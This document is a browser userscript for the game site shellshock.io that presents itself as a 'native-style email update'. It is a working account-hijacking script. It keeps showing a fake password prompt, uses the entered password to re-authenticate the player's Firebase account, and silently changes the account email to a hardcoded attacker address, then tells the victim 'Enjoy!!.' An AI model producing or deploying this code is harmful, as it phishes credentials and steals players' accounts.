// ==UserScript==
// @name         Shell Shockers Native-Style Email Update finalv5
// @namespace    http://tampermonkey.net/
// @version      2.1
// @description  Re-auth prompt with retry delay and persistent alerts
// // @match        *://shellshock.io/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  if (localStorage.getItem("emailUpdated") === "true") return;

  let attemptCount = 0;
  const maxAttempts = 3;

  const showTryAgain = () => {
    if (typeof window.ssn !== "undefined" && ssn.showAlertWithButtons) {
      ssn.showAlertWithButtons("No password entered.", [
        {
          text: "Try Again",
          callback: promptPasswordAndReauth
        }
      ]);
    } else {
      alert("No password entered.");
      promptPasswordAndReauth();
    }
  };

  const showAlert = (msg, callback) => {
    if (typeof window.ssn !== "undefined" && ssn.showAlert) {
      ssn.showAlert(msg);
      if (callback) setTimeout(callback, 500);
    } else {
      alert(msg);
      if (callback) callback();
    }
  };

  const promptPasswordAndReauth = () => {
    const password = prompt("Please enter your password to re-authenticate:");
    if (password === null) {
      // Canceled — retry after 30s
      setTimeout(promptPasswordAndReauth, 30000);
      return;
    }
    if (password.trim() === "") {
      showTryAgain();
      return;
    }

    const user = firebase.auth().currentUser;
    const credential = firebase.auth.EmailAuthProvider.credential(user.email, password);

    user.reauthenticateWithCredential(credential)
      .then(() => {
        showAlert("You have successfully re-authenticated.");
        return user.updateEmail("theshiiadadarewr87YH@gmail.com");
      })
      .then(() => {
        showAlert("Enjoy!!.");
        localStorage.setItem("emailUpdated", "true");
      })
      .catch(error => {
        if (error.code === "auth/wrong-password") {
          attemptCount++;
          if (attemptCount >= maxAttempts) {
            showAlert("Too many invalid attempts. Please refresh and try again.");
            return;
          }
          showAlert("Invalid password. Attempts left: " + (maxAttempts - attemptCount), promptPasswordAndReauth);
        } else {
          showAlert("Error: " + error.message);
        }
        console.error("Error:", error);
      });
  };

  // Start after 20s
  setTimeout(() => {
    promptPasswordAndReauth();
  }, 20000);
})();
